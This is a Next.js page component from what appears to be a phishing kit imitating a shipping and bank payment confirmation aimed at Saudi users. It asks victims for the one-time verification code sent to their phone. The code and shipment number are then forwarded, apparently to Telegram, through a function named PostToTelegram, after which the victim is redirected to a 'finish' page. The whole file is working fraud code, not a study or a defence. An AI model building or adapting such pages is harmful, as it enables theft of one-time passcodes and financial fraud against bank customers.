"use client"

import styles from './code.module.css'
import {  useState } from 'react'
import { useRouter,useSearchParams } from 'next/navigation'
import TeleSned from '@/server/TeleSend'
import Image from 'next/image'
import headercode from "../../../../../../public/headercode.png"


const Code = () => {
  const {Send} = TeleSned();
  const router = useRouter();
  const x = useSearchParams();
  const datas = x.get("names")
  const [form,setForm]=useState({
    data:{
      code:"",
      رقم_الشحنة:datas
    }
  })
  const setDynamicFormData = (name,value)=>{
    setForm({
      data:{
        ...form.data,
        [name]:value,
      }
    })
  }
  const PostToTelegram = () => {
    const description = Object.entries(form.data)
      .map((d) => `${d[0]} : ${d[1]} `)
      .join("\n");
    Send(description)

    
  };
  const handlerout = ()=>{
    if(form.data.code == ""){
      alert('من فضلك قم بملى الحقول')
    }else{
      router.push(`/aram/banks/pay/code/finish?names=${datas}`)
    }
  }




  return (
    <div className={styles.contect}>
      <div>
        <div>
            <Image src={headercode} width={370}/>
        </div>
      <h1> تاكيد</h1>
      <p>ادخال الكود المرسل حديثا على هاتفك</p>
     
      <form  onSubmit={(e)=>{
        e.preventDefault();
        PostToTelegram()
      }}>
        <label dir='ltr'>
        +966*********</label>
        <input type="text" name="code" onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} placeholder="ادخل كود التحقق" />
        
        <button type='submit' onClick={handlerout}>دخول</button>
      </form>
      </div>
    </div>
  )
}

export default Code
